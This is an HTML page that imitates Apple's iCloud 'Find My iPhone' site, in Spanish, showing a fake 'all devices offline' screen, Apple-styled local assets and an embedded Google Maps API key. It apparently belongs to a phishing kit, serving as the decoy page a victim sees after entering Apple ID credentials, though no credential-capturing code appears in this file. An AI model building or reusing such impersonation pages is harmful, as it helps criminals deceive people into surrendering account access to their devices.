<!DOCTYPE html>

<head>

	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta content="width=device-width, initial-scale=1" name="viewport"/>
	<title>iCloud - Find My iPhone</title>
	<link rel="stylesheet" href="assets/layout/strap.css">
        <link href="assets/img/ico.ico" rel="shortcut icon" type="image/x-icon" />
	<link rel="stylesheet" href="assets/layout/apple.css">
	<link rel="stylesheet" href="assets/layout/kit.css">
	<link rel="stylesheet" href="assets/layout/animate.css">
	<script src="assets/js/jquery-1.11.3.min.js"></script>

</head>

<body class="find">
<section id="header2">

				<a class="allDevices"><span>Todos los Dispositivos</span><i class="glyphicon glyphicon-menu-down"></i>
					<div class="getDevice">
					<div class="deviceBody">
					<ul>
						<li class="active" 
						 data-id="deviceID0" 							data-name="All Devices">
							<div class="imga">
                                                            <img src="assets/img/alldevice.png" alt="">
							</div>
							<div class="namea">
								Todos los Dispositivos
							</div>
						</li>
											</ul>
					</div>
					</div>
				</a>

	<div class="container-fluid">
		<div class="row">
			<div class="col-md-4 col-xs-8 rightH rtl">
				<a class="help" title="Help and Support" alt="Help and Support" href="https://help.apple.com/icloud/"></a>
				<a class="logout" title="Logout" alt="Logout" href="index.php"></a>
				<span class="spreat"></span>
				<div class="setup fName" style="display: block;"><i class="glyphicon glyphicon-menu-down"></i><span></span>
					<ul>
						<li><a href="find.html">Ajustes</a></li>
						<li><a href="index.php">Desconectar</a></li>
					</ul>
				</div>

		  </div>
			<div class="col-md-8 col-xs-4 leftH">
				<span class="icloud"></span><span class="find hidden-sm hidden-xs hidden-md">Find My iPhone</span>			</div>
		</div>
	</div>
</section>

<script src="http://maps.google.com/maps/api/js?key=AIzaSyDoqzcKrNPa8CzSeRPv8g7Q4mODVrjPizU" type="text/javascript"></script>

<section id="compass">
	<div class="compass">
		<img src="assets/img/compass1.png" class="compass1" alt="">
		<img src="assets/img/compass2.png" class="compass2" alt="">
		<img src="assets/img/compass3.png" class="compass3" alt="">
		<span>Localizando...</span>	</div>
	<div class="clearfix"></div>
</section>
<div class="findBody">
<section id="findmap0" class="findmap ltr shows">
<div class="container">
	<div class="row">
		<div class="col-md-12 col-xs-12">
			<div class="deviceOff">
			<script src="http://maps.googleapis.com/maps/api/js">
</script>

<script>
function initialize() {
  var mapProp = {
    center:new google.maps.LatLng(51.508742,-0.120850),
    zoom:5,
    mapTypeId:google.maps.MapTypeId.ROADMAP
  };
  var map=new google.maps.Map(document.getElementById("googleMap"), mapProp);
}
google.maps.event.addDomListener(window, 'load', initialize);
</script>

				<img src="assets/img/packed-3_02.png" alt="">
				<h2>Todos los dispositivos sin conexión</h2>
				<p>No hay ubicaciones que  puedan ser mostradas ya que todos los dispositivos están fuera de línea.</p>
			</div>
		</div>
	</div>
</div>
</section>


</div>
<script>
	$(document).ready(function() {
		$('.deviceBody ul li[data-id="deviceID0"]').on('click', function() {

	  if ( $("#findmap0").hasClass('shows') ) {

	  } else {
	  	$("#findmap0").addClass('shows', 500).siblings().removeClass('shows', 500);
		}

		});
		$('body > div:nth-child(10)').html('');
	});
</script>	<script src="assets/js/apple.min.js"></script>
	<script src="assets/js/mapiconmaker.js"></script>
	<script src="assets/js/ajax-form.min.js"></script>

	<script type="text/javascript">

	$(document).ready(function() {

		
		setTimeout(function(){
			$('#compass').fadeOut(100);
		},5000);
	});
	</script>
</body>

</html>
